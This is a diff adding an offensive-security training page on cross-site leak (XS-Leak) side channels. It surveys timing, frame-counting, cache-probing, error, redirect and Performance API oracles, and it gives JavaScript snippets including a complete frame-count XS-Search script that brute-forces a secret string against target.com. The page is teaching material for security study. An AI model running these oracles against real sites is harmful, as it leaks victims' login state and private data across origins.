@@ -1,0 +1,196 @@
+---
+layout: training-page
+title: "XS-Leak (Cross-Site Leaks) — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - xs-leak
+  - side-channel
+  - timing-attack
+  - frame-counting
+  - cache-probing
+page_key: "web-xs-leak"
+---
+<h1>XS-Leak (Cross-Site Leaks)</h1>
+<p>
+  Cross-Site Leaks (XS-Leaks) are side-channel vulnerabilities that allow an attacker to infer
+  sensitive information about a victim's state on another origin — without reading the actual
+  response body. Unlike CORS or XSS, XS-Leaks exploit observable browser behaviors: timing
+  differences, iframe counts, error events, cache hits, and navigation side effects.
+</p>
+<p>
+  The attacker's page can observe indirect signals from requests to the target origin to answer
+  boolean questions: "Is the user logged in?", "Does the user have admin privileges?",
+  "Does a search for 'password' return results?" — and iteratively leak sensitive data.
+</p>
+
+<h2>Tools</h2>
+<ul>
+  <li>xsinator.com — XS-Leak browser test suite — <code>github.com/RUB-NDS/xsinator.com</code></li>
+  <li>AutoLeak — find XS-Leaks by diffing DOM graphs in two states — <code>github.com/RUB-NDS/AutoLeak</code></li>
+</ul>
+
+<h2>Attack Primitives</h2>
+<p>Each primitive leaks a different type of information:</p>
+<pre><code>Timing      → Resource size or processing complexity
+Frame count → Whether content loaded (different pages have different iframes)
+Errors      → Access control decisions (403 vs 200 differences)
+Cache       → Whether the user previously visited a page
+Navigation  → Authentication state (redirect destination differs per auth state)
+Rendering   → Text length or content differences</code></pre>
+
+<h2>XS-Search</h2>
+<p>
+  XS-Search abuses query-based search systems. By making a search request and observing a side
+  effect (timing, frame count, error), the attacker learns whether the query returned results.
+  This boolean oracle is then used to brute-force sensitive data character by character.
+</p>
+<p>
+  Example pipeline: attacker opens 50 tabs, measures the timing of an iframe CSP violation
+  triggered only when search results exist, and uses timing differences to determine each
+  character of a flag or sensitive string.
+</p>
+
+<h2>Timing Attacks</h2>
+<p>
+  Measure how long a cross-origin request takes to complete. A query that returns many results
+  takes longer than one returning none. An authenticated endpoint takes a different time than a
+  rejected one.
+</p>
+<pre><code>// Measure response time for a cross-origin resource
+const start = performance.now();
+fetch('https://target.com/api/search?q=admin', { mode: 'no-cors' })
+  .then(() =&gt; {
+    const elapsed = performance.now() - start;
+    console.log('Response time:', elapsed, 'ms');
+    // Compare against baseline to infer search hit/miss
+  });</code></pre>
+
+<h2>Frame Counting</h2>
+<p>
+  If a page renders a different number of iframes based on the user's state (e.g., search results
+  page shows one iframe per result), an attacker can count them to infer data.
+</p>
+<pre><code>// Open the target page and count its iframes
+var win = window.open('https://target.com/search?q=secret');
+
+setTimeout(function() {
+  // win.length returns the number of frames in the window
+  console.log(win.length + " iframes detected");
+  // 0 frames = no results; N frames = N results found
+}, 2000);</code></pre>
+
+<h2>Cache Probing</h2>
+<p>
+  Determine whether the victim has previously visited a specific page by checking if its resources
+  are cached. A cached resource loads faster than an uncached one. If the resource only gets cached
+  when a user is authenticated, its presence in cache reveals authentication state.
+</p>
+<pre><code>// Probe cache by measuring load time of a resource
+function probeCacheForResource(url) {
+  const img = new Image();
+  const start = performance.now();
+  img.onload = img.onerror = function() {
+    const time = performance.now() - start;
+    if (time &lt; 5) {
+      console.log(url + " — likely CACHED (user visited this page)");
+    } else {
+      console.log(url + " — likely NOT CACHED");
+    }
+  };
+  img.src = url + '?cachebuster=' + Math.random();
+}</code></pre>
+
+<h2>Known Oracle Techniques</h2>
+<h3>Error-Based Oracles</h3>
+<ul>
+  <li><strong>Event Handler Leak (Script)</strong> — detect errors with onload/onerror on &lt;script&gt; tag; 200 vs 403 behavior differs</li>
+  <li><strong>Event Handler Leak (Stylesheet)</strong> — same with stylesheet; cross-origin load success/failure reveals access control</li>
+  <li><strong>MediaError Leak</strong> — detect HTTP status codes via MediaError.message on audio/video elements</li>
+  <li><strong>SRI Error Leak</strong> — leak content length via Subresource Integrity mismatch error</li>
+</ul>
+
+<h3>Header Detection Oracles</h3>
+<ul>
+  <li><strong>COOP Leak</strong> — detect Cross-Origin-Opener-Policy header presence using popup behavior</li>
+  <li><strong>CORP Leak</strong> — detect Cross-Origin-Resource-Policy header via fetch behavior</li>
+  <li><strong>CORB Leak</strong> — detect X-Content-Type-Options in combination with specific content types</li>
+  <li><strong>CSP Directive Leak</strong> — detect CSP directives using iframe CSP attribute</li>
+  <li><strong>CSP Violation Leak</strong> — leak cross-origin redirect target via CSP violation event</li>
+  <li><strong>ContentDocument X-Frame Leak</strong> — detect X-Frame-Options via ContentDocument</li>
+</ul>
+
+<h3>Redirect Detection Oracles</h3>
+<ul>
+  <li><strong>Fetch Redirect Leak</strong> — detect HTTP redirects using the Fetch API opaque redirect response</li>
+  <li><strong>Duration Redirect Leak</strong> — detect cross-origin redirects by checking response duration</li>
+  <li><strong>CSP Redirect Detection</strong> — detect cross-origin redirects via CSP violation events</li>
+  <li><strong>Max Redirect Leak</strong> — detect server redirects by hitting the browser's max redirect limit</li>
+  <li><strong>Redirect Start Leak</strong> — detect HTTP redirects via redirectStart time in Performance API</li>
+</ul>
+
+<h3>Performance API Oracles</h3>
+<ul>
+  <li><strong>Performance API Error Leak</strong> — detect request errors via performance timeline entries</li>
+  <li><strong>Performance API Empty Page Leak</strong> — detect empty (204) responses</li>
+  <li><strong>Performance API Download Detection</strong> — detect Content-Disposition responses</li>
+  <li><strong>Performance API CORP Leak</strong> — detect Cross-Origin-Resource-Policy header</li>
+</ul>
+
+<h3>Media Oracles</h3>
+<ul>
+  <li><strong>Media Dimensions Leak</strong> — leak image or video dimensions cross-origin</li>
+  <li><strong>Media Duration Leak</strong> — leak audio or video duration cross-origin</li>
+</ul>
+
+<h3>Miscellaneous Oracles</h3>
+<ul>
+  <li><strong>History Length Leak</strong> — detect JavaScript redirects via window.history.length</li>
+  <li><strong>Id Attribute Leak</strong> — leak id attribute of focusable HTML elements via onblur event</li>
+  <li><strong>Download Detection</strong> — detect Content-Disposition: attachment responses</li>
+  <li><strong>ETag Header Length Leak</strong> — detect response body size via ETag header string length (newer technique)</li>
+  <li><strong>URL Max Length Leak</strong> — detect server redirects by sending URLs near the max length limit</li>
+  <li><strong>WebSocket Leak (Chrome/Firefox)</strong> — detect active WebSockets by exhausting socket limits</li>
+  <li><strong>CSS Property Leak</strong> — leak CSS rules via getComputedStyle cross-origin</li>
+</ul>
+
+<h2>Practical XS-Search Example</h2>
+<pre><code>// Boolean oracle: does /inbox?search=X return results?
+// Uses frame count as signal
+function searchOracle(query, callback) {
+  var win = window.open('https://target.com/inbox?search=' + encodeURIComponent(query));
+  setTimeout(function() {
+    var frames = win.length;
+    win.close();
+    // 1+ frames means results found; 0 frames means no results
+    callback(frames &gt; 0);
+  }, 1500);
+}
+
+// Brute-force a secret string character by character
+var charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
+var known = 'flag{';
+
+function bruteNextChar(idx) {
+  if (idx &gt;= charset.length) return;
+  var candidate = known + charset[idx];
+  searchOracle(candidate, function(hit) {
+    if (hit) {
+      known = candidate;
+      console.log('Found so far:', known);
+      bruteNextChar(0); // restart from first char for next position
+    } else {
+      bruteNextChar(idx + 1);
+    }
+  });
+}
+bruteNextChar(0);</code></pre>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings XS-Leak — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XS-Leak</code></li>
+  <li>xsleaks.dev — comprehensive XS-Leaks wiki — <code>xsleaks.dev</code></li>
+  <li>xsinator.com test suite — <code>xsinator.com</code></li>
+  <li>Root Me XS Leaks challenge — <code>root-me.org/en/Challenges/Web-Client/XS-Leaks</code></li>
+  <li>XS-Leak: Leaking IDs using focus — Gareth Heyes — portswigger.net/research</li>
+  <li>Cross-Site ETag Length Leak — Takeshi Kaneko, December 2025</li>
+</ul>
